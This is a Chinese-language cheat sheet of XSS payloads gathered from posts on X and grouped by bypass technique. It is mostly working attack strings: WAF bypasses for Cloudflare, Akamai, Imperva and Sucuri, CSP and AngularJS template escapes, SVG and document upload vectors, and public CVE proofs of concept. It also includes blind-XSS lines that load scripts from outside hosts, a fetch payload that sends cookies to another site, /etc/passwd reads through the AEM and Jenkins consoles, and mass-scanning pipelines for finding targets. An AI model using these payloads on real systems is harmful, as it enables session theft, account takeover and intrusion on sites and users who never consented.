# X 语料 · XSS 跨站脚本（3）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。

原文件为逐条流水，同一载荷被大量转贴（email 那条转了 6 次，Cloudflare `atob` 那条 4 次），
此处按**绕过原理**重组，同原理合并。纯战绩播报、YouTube 引流、载荷已被图片吞掉的空条目已剔除。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[XSS](../by-type/xss.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-xss-1（300 条）、x-xss-2（300 条）、x-exp-xss（209 条）、x-residual-xss（111 条） · 本文 766 行

## 判定：先看反射上下文

- 不要用 `<script>` 当主力。运行时插入的 `<script>` 不会执行，用 `"'>` 起手。
  把 `<script>` 当主载荷会漏掉大量真实漏洞。
- 数据反射在 `<script>` 内双引号中时，**不需要**转义双引号就能触发。
- 反射在 `<script>` 里的注入不需要新建标签，复用已有 script 上下文即可：
  ```
  '-confirm(1)//
  ```
- 输出落在 JS 里的情况，按顺序试：
  ```
  ');alert(1);//
  ';alert(1)//
  ";alert(1);//
  '});prompt(2)({
  '-alert(1)-'
  ''.replace.call`1${/.../}${alert}`
  'blobblob'.replace.call('1,,', /.../, alert)
  a=alert,(a?a:a)(origin)
  ```
- `.php?` 参数统一先跑一遍：`cat parameters.txt | grep ".php?" > php-params.txt`
- 落在 `<textarea>` 里时先闭合它：`</textarea>`。
  普通载荷在这个上下文完全不会触发。
- 跨字段拼接：`FName` 只放一半，`LName` 放另一半，
  应用把两段拼起来渲染时就会合体触发。适合注册/个人资料表单。
- 特殊字符可能被重编码成别的东西。有一例 `+` 被渲染成 `"`，正好用来闭合属性：
  ```
  +onmouseover=confirm(document.domain)+x
  ```
## 通用反射载荷
  ```
  '"><svg+onload=alert(document.domain)>
  ```
  ```
  "'`//><Svg+Only%3d1+OnLoad%3dconfirm(document.cookie)>
  ```
  ```
  '";//>
  '";//></h1><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE%3d"))>
  ```
  ```
  主载荷+内联   1')"<!--><Svg OnLoad=(confirm)(1)<!--
  完整 URL 校验  JavaScript://%250Dtop.confirm?.(1)//
  弱 CSP 绕过    1'"><!--><Base Href=//X55.is?
  常规 JS 注入   1'-top['con\146irm'](1)-'
  无引号 JSi     /confirm?.(1)//\
  ```
- 盲打用的组合，`<Script` 失败时换 `<Img`，多反射点场景常能通：
  ```
  1"`/import(src)'<Script/Src=//X55.is?1=00><Img/OnLoad='`
  ```
- 一个想覆盖所有上下文的庞杂载荷：
  ```
  JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
  <!--</Title/</Style/</Script/</textArea/</iFrame>
  \74k<K/contentEditable/autoFocus/OnFocus=
  /*${/*/;{/**/(import(/\https://X55.is/.source))}//\76-->
  ```
- 闭合已有 `</script>` 后再开：
  ```
  */</script>'>alert(1)/*<script/1='
  ```
- `</script>` 的斜杠也能变形：
  ```
  "><script>alert(document.cookie)<~2Fscript>
  ```
  ```
  <script>eval(name);</script>
  ```
  ```
  <sCriPt x>(((confirm)))``</scRipt x>
  ```
  ```
  <script ysx<>Reflect.apply(alert,null,[1])</script xy<>>
  ```
- 用迭代器协议触发：
  ```
  [...{[Symbol.iterator]:\u0061lert.bind(null,'catfather')}]
  ```
- `replace.call` 直接调函数：
  ```
  'a'.replace.call`1${/./}${alert}`/
  ```
  ```
  <script>alert(49)</script>
  <ScRiPt>alert(49)</ScRiPt>
  <s&#x63;ript>alert(49)</s&#x63;ript>
  <script>eval('ale' + 'rt(49)')</script>
  <script onload="alert(49)"></script>
  <script oninput='alert(49)'></script>
  %3Cscript%3Ealert%2849%29%3C%2Fscript%3E
  ' OR alert(49); --
  ```
- 参数传数组形态绕过滤，值会落进页面 JS：
  ```
  param=test<script>alert(1)<script>     → 被拦
  param[<script>alert(1)</script>]       → 通过
  ```
- `throw` 接受表达式，可以在抛异常之前挂 handler：
  ```
  throw onerror = alert, 'some string', 123, 'haha'
  ```
  ```
  <script class=whoami>http://window.open("Calculator:///");</script>
  ```
- 整个载荷塞进 `srcdoc`，不需要闭合外层标签：
  ```
  <iframe srcdoc="<script>alert('XSS')</script>"></iframe>
  ```
## 属性与事件处理器
- `<>` 被过滤、`"()` 能过时：
  ```
  XSS"onfocus="prompt(document.cookie)"autofocus="
  ```
- `<` `>` 被过滤，就注入到 `<input>` 里：
  ```
  " onfocus="alert('chux')" autofocus="" />
  ```
- 空白与大小写混用来过 Cloudflare：
  ```
  "><iNput///type="password"////id="CF-bypaSS" name="query"////value=""///oNfocUs="alert('hello')" AutOfoCus="" />
  ```
  ```
  " accesskey="X" onclick="alert(1)"
  ```
- 铺满视口，任意点击都触发：
  ```
  "onmouseover="alert(1)" style="position:absolute;width:100%;height:100%;top:0;left:0;"
  ```
  ```
  <a style="position: fixed; top: 0; left: 0; z-index: 99999; width: 100%; height: 100%;" onmouseover=alert(1)>
  ```
  ```
  /><output name="result" onclick="alert('something')">chux</output>
  ```
  ```
  "><HTML onmouSeovEr=confirm(document.cookie)x>
  ```
- 少见事件，Safari + 触控板点击生效：
  ```
  " onwebkitmouseforcewillbegin="confirm(origin)"
  ```
- `<Img Src=javascript:...>` 已经不灵了，但加上 `OnError=location=src` 就活：
  ```
  <Img Src=javascript:alert(1) OnError=location=src>
  ```
- WAF 拦所有 `</` 时，先做 HTML 注入把标签拼出来：
  ```
  </a<script>alert(document.cookie</script>
  ```
  ```
  "'>"
  ```
  够用就好，不需要更复杂的。
- 同理，与 `'>"><svg onload=alert()>` 相比 `'>">` 更不容易被渲染怪癖打断。
- 闭合 style 与 script 后再起：
  ```
  --%3E%3C/style%3E%3C/scRipt%3E%3CscRipt%3Ealert(document.domain)%3C/scRipt%3E
  ```
## WAF 绕过
### Cloudflare
  ```
  "><body/onload="{x:onerror=alert};x"
  ```
- （ASPNET 通用 WAF，AFW00F 可识别）
  `\u00` 转义 + 实体填充：
  ```
  <details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc(`VulneravelXSS`%26%2300000000000000000041//
  ```
  ```
  <svg%20oNinad=1%20onload=alert(document.cookie)>
  ```
  ```
  <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
  ```
  ```
  "><div/onclick="(function(){setTimeout(()%20=>%20alert(document.domain),%200);})();">Click%20me!</div>
  ```
  ```
  "%3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e
  ```
- 实体编码每个字符：
  ```
  "><svg/class=test onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
  ```
  ```
  0</option></select>ss<svg/onload​=prompt(document.cookie)%20>
  ```
  ```
  <Svg%20Only=1%20OnLoad=confirm(atob(%27Q2xvdWRmbGFyZSBieXBhc3NlZA==%27))>
  ```
  ```
  "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
  ```
  ```
  <button%20popovertarget=x>Click%20me</button>XSS
  ```
- `noembed` 会吞掉后续标签解析：
  ```
  <select><noembed></delect><script x='a@b'a>
  y='a@b'//a@b%0a\u0061lert(1)</script x>
  ```
- 组合清单：
  ```
  <select><style></select>
  <svg onload=alert(1)>
  </style>
  ">
  <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
  <svg onload=alert&#0000000040"1")><""">
  ```
  ```
  %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
  ```
- HTML 净化器绕过：
  ```
  '<00 foo="<a%20href="javascript:alert('XSS-Bypass')">XSS-Click</00>--%20/
  ```
- URL 被直接打印进 JS 时，用 `--` 起头：
  ```
  --'<00 foo="<a%20href="javascript:prompt(404)">XSS-Click</00>--%20//
  ```
  ```
  "><deTAIls/+/oNTogGLE%0A=%0Aconfirm()%0Dx>
  ```
- 函数名前后插不可见分隔符：
  ```
  <svg/onload=&nbsp;alert&#65279;(2)>
  ```
- HTML 实体编码本身有时就能过 Cloudflare 的过滤，多试几种编码。
- `confirm?.()` 可选调用 + 注释包裹，前后各留一段无效闭合吸收过滤：
  ```
  "<%21--><Svg+OnLoad%3Dconfirm%3F.%28%2Fd3rk%2F%29<%21--1"%29"<%21--><Svg%2BOnLoad%3Dconfirm%3F.%28%2Fd3rk%2F%29<%21--
  ```
- `ontoggle` + `\u006e` 转义：
  ```
  "-->"/>0xr3dhunt</script><deTailS open x=">" ontoggle=(co\u006efirm)``>"
  "-->"/>0xr3dhunt</script><deTailS open x=">" ontoggle=(co\u006efirm(document.cookie))``>"
  ```
### Akamai
  ```
  ';k='e'%0Atop['al'+k+'rt'](1)//
  ```
  ```
  <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
  ```
- `contentvisibilityautostatechange` 事件，配合 `content-visibility:auto`：
  ```
  ' oncontent\visibilityautostatechange='a=alert,(a?a:a)(origin)' x=\v+styl\u0065='content-visibility:auto
  ```
- 同族事件：
  ```
  "><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
  ```
- 遍历 `self` 找出 `fetch` 这个名字再调用，规避关键字过滤：
  ```
  javascript:for(k in self)if(k.length==5&&/fetc/.test(k))for(f in self)if(f==k)self[f]`https://webhook`
  ```
### Imperva
  ```
  <svg><animatetransform onbegin=print()>
  ```
- 用解构把 `earltv` 重排成 `alert`：
  ```
  <a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
  ```
### Sucuri / ModSecurity / Cloudfront
- Sucuri，字符间插反斜杠：
  ```
  <s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
  <details/open=/Open/href=/data=;+ontoggle="(alert)(document.domain)
  ```
- ModSecurity：常规载荷 406，换一种变形就 200。
- （Cloudfront）
  四步组合：
  ```
  1) alert = window["al"+"ert"]
  2) 用 `` 代替 ()
  3) 空格换 /
  4) 编码符号  < = %3c  > = %3e  " = %22  [ = %5b  ] = %5d  ` = %60
  <svg/onload=window["al"+"ert"]`1337`>
  ```
- 同思路的最小版本：
  ```
  %3csvg/onload=window%5b"al"+"ert"%5d`1337`%3e
  ```
## 编码与字符集技巧
  ```
  <SvG><set%0Aonbegin%0A=%0aa=confirm;a%28%60xss%60)/x>
  ```
- `\u00` 转义 + 字符串拼接绕过：
  ```
  <details/open%0Aontoggle%0D=prom\u0070t`${d\u006fcument['coo'.concat`kie`]}`>
  ```
- 用 Tab 切分 `javascript` 关键字，可绕过已有修复：
  ```
  %09Jav%09ascript:alert(1)
  ```
- 十进制实体编码：
  ```
  url=%26%2302java%26%23115cript:alert(document.domain)
  ```
- （Cloudflare）
  实体编码 + 空格与点号变形：
  ```
  <a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *>
  ```
- 事件体里的字符用十六进制：
  ```
  '<svg onload="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')"></svg>'
  ```
- 用 Unicode 私有区字符充当变量名，整套逻辑不带一个字母：
  ```
  onerror="
  𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(𐂃)')()"
  ```
- `.` 被拦时，`document.cookie` 用裸 `cookie` 顶替（部分上下文全局可达）：
  ```
  alert(cookie)
  ```
- 正则变形，把被拆散的字符重新拼回来：
  ```
  c.replace(/[abc]/g, '')).join(''))">
  c.charCodeAt(0) !== 121).join(''))">
  ```
- 对正则过滤做 alert 混淆是常规手段，不必每次都用同一套编码。
- （CSV 上传，渲染在 `<option>` 里）
  ```
  </option>
  ```
  ```
  ''"><script>(1)</script><iFrAme/src=jaVascRipt:prompt.valueOf()(1)+class=spider></iFramE>
  ```
## `javascript:` 协议与 DOM XSS
- 事件处理器全被过滤时，用 `href` 里的 `javascript:`：
  ```
  <a href=javascript:alert()>Click</a>
  ```
- 重定向 sink 里别用 `javascript:alert(1)`。目标常校验 host 不校验 scheme：
  ```
  javascript://target.com/%E2%80%A8alert(1)
  ```
  ```
  javascript://huli.tw/%0aalert(1)
  ```
- `javascript:alert();` 不触发，去掉分号就好：
  ```
  javascript:alert()
  ```
- `javascript:` 不被拦但 `alert()` 被拦时，用 `.source` 拼出函数名：
  ```
  /path?next=javascript:top[/al/.source+/ert/.source](document.cookie)
  ```
- 三种等价载体的备忘：
  ```
  file:///C:/path/to/malicious/script.js
  javascript:alert(document.domain)
  data:text/html,<script>alert(document.domain)</script>
  ```
- `jaVasCript:` + 注释 + 多标签闭合的巨型多语境载荷：
  ```
  %3Cinput%20type=text%20value=jaVasCript:/*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert()//%3E\x3e%3E%3C/input%3E
  ```
- 注入点就在 URL 路径本身，不需要参数：
  ```
  %3Csvg%20onload=alert(%22MrHex88%22)%3E
  %3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E
  ```
- `.css` 路径名里注入：
  ```
  原 URL: /lib/css/animated.min.css
  载荷:   /lib/css/animated.min'"/><script%20>alert(document.domain)<%2fscript>.css
  ```
- 需要改可见性才触发的情况：
  ```
  /Login.html?open&ErrMsg=invalidlogin"%20type="visible"%20src=x%20onerror="confirm(1)"
  ```
- SiteMinder 的 DOM XSS，载荷被整段 Unicode 转义：
  ```
  \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
  ```
- 403 的绕过写法，`/%3f/` 变 200 后再做参数 dork：
  ```
  https://sub.target.com/%3f/
  site:*.target.com inurl:"?name="
  site:*.target.com inurl:"?type="
  ```
- （Burp 项目配置）
  响应替换：301/302 → 200、403 → 200、`:false` → `:true`，
  并把 xss 测试用文本做替换；过滤掉 svg/ico/woff 噪音。
## CSP 绕过与模板注入
- CSP 允许 `ajax.googleapis.com` 时借 AngularJS 打：
  ```
  <div ng-app><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.6 /angular.min.js"></script> <input ng-focus=$event.view.alert($event.view.document.cookie)>
  ```
- CSP 允许 `microsoft.com` 时，用 WordPress JSONP 的 same-origin 方法执行：
  ```
  <script src=http://microsoft.com/en-us/research/wp-json?_jsonp=alert…></script>
  ```
- CSP 挡住时，把载荷拆成**两个**分开发送，可能有奇效：
  ```
  1- %3C/script%20%3E
  2- mitsecXSS%22%3E%3Cinput%20%00%20onControl%20hello%20oninput=confirm(1)%20x%3E
  ```
- CSTI 与反射型 XSS 通用，可能顺带触发代码注入：
  ```
  '%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
  ```
- CSTI 升级为 XSS，改 `charAt` 绕黑名单：
  ```
  {{a=toString().constructor.prototype;a.charAt=a.trim;$eval(%27a,alert(1),a%27)}}
  ```
- （AngularJS 1.2.24–1.2.29）
  ```
  {{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
  ```
- 老版本 AngularJS 的表达式注入更短：
  ```
  {{$on.constructor('alert(document.domain)')()}}
  ```
- Go 模板的 SSTI，用来绕 HTML 净化：
  ```
  {{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}
  ```
- 把 SSTI 与 SSRF 串在一条里：
  ```
  {{ 7 * "><script src="http://169.254.169.254/payload.dtd">alert(" ' and 1=1;—")</script>}}
  ```
## Blind XSS
- 三种常用形态：
  ```
  "><script src="http://custom.domain"></script>
  "><script src=//<custom.subdomain>.xss.ht></script>
  <script>$.getScript("//<custom.subdomain>.xss.ht")</script>
  ```
- `import()` 版，不依赖 `<script src>`：
  ```
  '"><Svg Src=//server OnLoad=import(this.getAttribute('src')+0)>
  ```
- `base href` 版，适合需要相对路径解析的页面：
  ```
  %22%3E%3Cbase%20href%3D%2F%2Fxss.report/c/yaseen%3E
  ```
- 想想 `<title>`/`<style>`/`<textarea>`/`<script>` 全都闭合一遍是不是更稳：
  ```
  --></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss/"></scrIpt>
  ```
  **载荷本身通常是对的，问题在于找对注入点。**
  ```
  '"></title></textarea></script></style></noscript><script src=https://xss0r.com/c/chef-chef></script>
  ```
  ```
  </noscript><script src=https://xss0r.com/c/server></script>
  ```
- （feedback 表单/邮件门户）
  ```
  ';"/></textarea></script><script src="https://xss.report/c/mokokko"></script>
  ```
- 消息门户：
  ```
  '//><scrIpt src=//xss.report/c/kee-kee></scrIpt>
  ```
- `atob` 解 id 属性，把 JS 藏进属性里：
  ```
  %22%3E%3Cinput%20onfocus%3Deval%28atob%28this.id%29%29%20id%3DdmFyIGE9ZG9jdW1lbnQpOw%20autofocus%3E
  ```
- 盲打请求头，用 bxss 批量：
  ```
  findomain -t TARGET.COM | gau | bxss -payload '"><script src=https://chirag.bxss.in></script>' -header "X-Forwarded-For"
  ```
- 一次把 blind XSS / SSTI / LFI 三种都撒进头里：
  ```
  gospider -S hosts -a -w --sitemap -r -c 20 -d 8 \
    -H "User-Agentt: blindxss" \
    -H "X-Forward-For: '">{{7*7}}${2*2}" \
    -H "Accept: ../../../../../../../../../../etc/passwd{{" -p http://127.0.0.1:8080
  ```
  之后在 Burp 搜索里查 `root:[x*]:0:0:`。
- 登录框本身：`password="><svg/onload=prompt(1)>`，
  后台若把口令回显在用户列表里就是存储型。
- 项目名 → 分享链接给受害者，是最省事的一条存储型路径。
- 找盲打入口：翻邮箱里的 Unsubscribe / feedback / Manage preferences，
  点进去，反馈框里放载荷。
- `https://dorkking.blindf.com` 一次生成 5 条找表单的 dork。
## 文件上传与文档载体
- SVG 上传造成开放重定向：
  ```
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <svg onload="window.location='http://google.com'" xmlns="http://w3.org/2000/svg">
  </svg>
  ```
- SVG 内嵌 `foreignObject` + iframe：
  ```
  <svg> <foreignObject width="100%" height="100%"> <body> <iframe src='javascript:confirm(10)'></iframe> </body> </foreignObject> </svg>
  ```
- CDATA 包住脚本：
  ```
  <svg xmlns="http://w3.org/2000/svg">
   <script>
   <![CDATA[alert(1);]]></script>
  </svg>
  ```
- 上传后缀限制绕过：先传 `xss.svg` 落到 `*.s3.amazonaws.com/xss.svg`，
  再 `httpx -l subs.txt -path /xss.svg` 在范围内找到同文件。
  存储型 XSS + 可托管钓鱼页。
- Magic byte 写 `GIF89;`，大部分后缀被拦但 `.htm` 能改名通过。
- 路径穿越拿回文件：上传后落在
  `https://test.com/file/res-30Y1iKPDqbLrW3rV8cl1hNpr7So/test.svg`，
  用 `../../test.htm` 换目录访问。
- `.docx` / `.xlsx` 不用宏：插入指向 `javascript:alert(1)` 的超链接，
  上传到带文件预览的目标，点击即触发。
- SVG 盲打载体：
  ```
  /_(filename)?href=https%3A%2F%2Fraw.githubusercontent.com/ynsmroztas/pdfsvgxsspayload/refs/heads/main/blind.svg&f=svg
  ```
- 预览/编辑器类功能：放
  ```
  <script>window.location.replace('https://cnn.com')</script>
  ```
  导出的文档里出现 cnn 页面，就是 XSS → SSRF 链。
## 特殊上下文
- `email` 参数，在本地部分后塞闭合符号：
  ```
  test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
  ```
- 直接拿邮箱地址本身当注入点（邮箱通常不做净化）。
  用 catch-all 域名，必要时还能完成验证：
  ```
  ">"@yourdomain.com
  ```
  参考 `brutelogic.com.br/blog/xss-limited-input-formats/`。
- 登录页：
  ```
  ');\\</script><script>alert(document.cookie)</script>('%00tst@tst.com.br
  ```
- `Content-Type: text/xml` 的反射：
  ```
  <x:script xmlns:x="http://w3.org/1999/xhtml">alert(document.cookie)</x:script>
  ```
- XML 文件承载：
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <html xmlns:html="http://w3.org/1999/xhtml">
  <html:script>prompt(document.domain);</html:script>
  </html>
  ```
- CRLF 注入成 XSS：
  ```
  %0d%0aX-XSS-Protection:0%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E%3C%21--
  ```
- WordPress 通用：`<noscript><p title="</noscript>">`
- CakePHP 2.2 的报错页：
  ```
  /pages/account/%22%3E%3Cimage%20src=x%20onerror=alert(0)%3E
  ```
- AEM 的 childrenlist：
  ```
  /IM49%3Cimg%20src=x%20data%27a%27onerror=alert%28domain%29%3E.childrenlist.html
  ```
- Google dork 找到的点，用最朴素的 `<h1></h1>` 起手，逐步加。
- 文本片段触发：`yoursite/index.html#:~:text=jsecurity`
- VBScript.Encode 的 iframe 形式（老 IE）：
  ```
  <iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
  <iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
  ```
## 已公开 CVE / 产品
- Citrix Gateway 未授权反射型 XSS（CVE-2023-24488）：
  ```
  shodan: http.title:"Citrix gateway"
  subfinder -dL domain.txt | httpx | nuclei -t /path/to/templates/citrix.yaml
  ```
- 同 CVE 的手工 POC：
  ```
  /oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E
  ```
- Salesforce 的 Visualforce：`component` 参数可绕 CSP 与防火墙。
  ```
  /apex/CommVisualforce?params=eyJjb21wb25lbnQiOiJjb21tQWxyZWFkeUN1c3RvbWVyIn0=
  {"component":"commAlreadyCustomer"}
  ```
- RoundCube 邮件系统的已知 XSS，靠 CSS 动画事件触发：
  ```
  <body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar"> Foo </body>
  ```
- Liferay（CVE-2025-4388）：
  ```
  /o/marketplace-app-manager-web/icon.jsp?iconURL=https:///<>"
  ```
- AEM 的 Groovy 控制台直通 RCE（XSS 之后的上限）：
  ```
  POST /bin/groovyconsole/post.servlet HTTP/1.1
  script=sef+proc+%3d+"cat+/etc/passwd".execute()%0d%0aprintln+proc.txt
  ```
  所有内容都存在 jcr 仓库里。
- Jenkins：拿到 dashboard 后 `/script` 可直接读文件：
  ```
  def passwdFile = new File("/etc/passwd")
  println passwdFile.text
  ```
## 提权与链式利用
- 一个重定向参数走完三段：
  传任意 URL 开放重定向 → 传 `javascript:alert(1)` 得 XSS
  → 构造窃取 cookie 并跳到自己站的载荷得 ATO。
- 用 `&colon;` `&lpar;` `&period;` 等实体编码拼出 fetch，绕字符过滤：
  ```
  #"></div><a href=javascript&colon;fetch&lpar;'//site&period;com/'&plus;document&period;cookie&rpar;
  ```
- 1. `site:*[.]redacted[.]com login.php`
  2. `arjun -u .../login.php`，找响应体长度有变化的参数
  3. 逐个参数测 SQLi / LFI / XSS / HTML 注入
- 别看到 HTML 注入就报，先找升级路径。
- 以为只有 XSS/SQLi 的参数，结果 `_session_name=` 直接给 RCE：
  ```
  &**='.print((`id`)).'
  ```
- 找注入类问题的通用套路：
  ```
  waybackurls http://target.com | grep = | tee param.txt
  cat param.txt | nuclei -t fuzzing-templates
  ```
  ```
  1. site:*.target.com ext:php
  2. echo https://sub.target.com | waybackurls | grep "\?" | uro | httpx -silent > parameters.txt
  3. nuclei -l parameters.txt -t fuzzing-templates
  ```
- 一次把四类注入都跑掉：
  ```
  gau http://target.com | gf xss,lfi,sqli,ssrf | qsreplace FUZZ \
    | ffuf -u FUZZ -w payloads/xss.txt,payloads/lfi.txt,payloads/sqli.txt,payloads/ssrf.txt -fr "FUZZ"
  ```
## 自动化
  ```
  cat file.txt | gf xss | grep 'source=' | qsreplace '"><script>confirm(1)</script>' \
    | while read host; do curl --silent --path-as-is --insecure "$host" \
    | grep -qs "<script>confirm(1)" && echo "$host Vulnerable"; done
  ```
  ```
  cat gau.txt | gf xss | uro | grep -v -e "jpg" -e "jpeg" -e "gif" -e "css" -e "tif" -e "tiff" -e "png" \
    | qsreplace -a | httpx -silent | tee xss.txt
  dalfox file xss.txt -b https://hahwul.xss.ht | tee results.txt
  ```
  ```
  1. subfinder -d target.com | httprobe -c 100 > target.txt
  2. cat target.txt | waybackurls | gf xss | kxxs
  ```
  ```
  cat domainlist.txt | subfinder | dnsx | waybackurls \
    | egrep -iv "\.(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" \
    | uro | dalfox pipe -b http://your.xss.ht -o xss.txt
  ```
  ```
  echo "http://testphp.vulnweb.com" | waybackurls | httpx -silent \
    | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
  ```
- 只取带参数的 php/asp：
  ```
  waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u \
    | sed 's/\(=[^&]*\)/=/g' | tee urls-xss.txt && cat urls-xss.txt | kxss
  ```
  ```
  cat urls.txt | gf xss | sed 's/=.*/=/' | sort -u | tee possible_xss.txt
  ```
- Arjun 找隐藏参数后直接接 kxss：
  ```
  arjun -q -u target -oT arjun && cat arjun \
    | awk -F'[?&]' '{baseUrl=$1; for(i=2; i<=NF; i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' \
    | kxss
  ```
- paramspider 结果不理想时，给它一个具体路径再跑：
  ```
  echo "http://domain.com/Online/" | waybackurls | gf xss | uro | httpx -silent
  ```
  ```
  gospider -S URLS.txt -c 10 -d 5 \
    --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" \
    --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace -a | dalfox pipe
  ```
- ffuf 自带多字典，不必写脚本：
  ```
  ffuf -c -w urls.txt:URL -w wordlist.txt:FUZZ -u URL/FUZZ -mc all -fc 500,502
  ```
- 把已确认的漏洞路径拿到所有子域再试一遍：
  ```
  cat urls.txt | httpx -silent -path '/vuln?s="'/><script>alert(1)</script>' | airixss -p "alert(1)"
  ```
  ```
  nuclei -l live-subs.txt -t /root/nuclei-templates/http/vulnerabilities/generic/top-xss-params.yaml
  ```
- 反射检测模板，同时覆盖 XSS、SSRF、缓存投毒、开放重定向、OAuth 重定向：
  ```
  nuclei -t reflection.yaml -u target
  ```
  ```
  python dork.py -d "site:*target filetype:php"
  ```
- 找易注入的参数名：
  ```
  site:example.com inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:&
  ```
- 控制台一行取出页面所有 JS：
  ```
  const html = document.documentElement.outerHTML;
  const jsSrcs = [...html.matchAll(/<script\b[^>]*src=["']([^"'>]+)["']/gi)].map(m => m[1]);
  alert(jsSrcs.join("\n"));
  ```
- 一次看似走不通的 recon，靠路径形态变化打开：
  ```
  1. subdomain          -> 404
  2. subdomain/FUZZ     -> 403
  3. subdomain-FUZZ     -> 200（空白页）
  4. subdomain-FUZZ/FUZZ -> swagger.json
  ```
- 被拦的路径参数整体 base64：
  ```
  url/?f=etc/passwd          → 403
  url/?f=L2V0Yy9wYXNzd2Q=    → 200
  ```
  同一招在 SQLi、SSTI、XSS、LFI 上通用。
- `1%27%22()%26%25` 起手式，配上闭合标签：
  ```
  1%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(1)%3C/ScRiPt%3E
  ```
- 存储型最短可用：
  ```
  `+alert`0`+`
  ```
- 图片上传走 URL 的入口：
  ```
  https://InvalidURL">"onmouseover=prompt(document.cookie)>
  ```
- 盲打/存储型一组备选：
  ```
  1. ">
  2. "><script>alert(1337)</script>
  3. <div/onmouseover='alert(1)'> style="x:">
  4. \";alert('XSS');//
  5. "autofocus/onfocus=alert(1)//
  6. '-alert(1)-'
  ```
- 过滤器会剥掉 `<<input>` 里的 `<input>`，剩下的 `<img ...>` 正好生效：
  ```
  <<input>img src=x onerror=alert()>
  ```
- 精简原则：先试最短能闭合的形态，再逐步加长。
## 代码审计线索
- Node.js 项目里搜这三种字符串，都是拼接进模板的强信号：
  ```
  ${req.query.
  ${req.body.
  ${JSON.stringify(req
  ```
- 缓存相关：`GET /api/nonsensitive/123%23non.svg`
  原本不返回敏感数据，被缓存后开始暴露 PII。
- reCAPTCHA 的奇怪分支：`{"Captcha":"test1"}` 返回 403，`{"Captcha":""}` 返回 200。
- 别只测页面，扫一遍字典里这些容易漏的：`/arsenal`、`qa.html`。
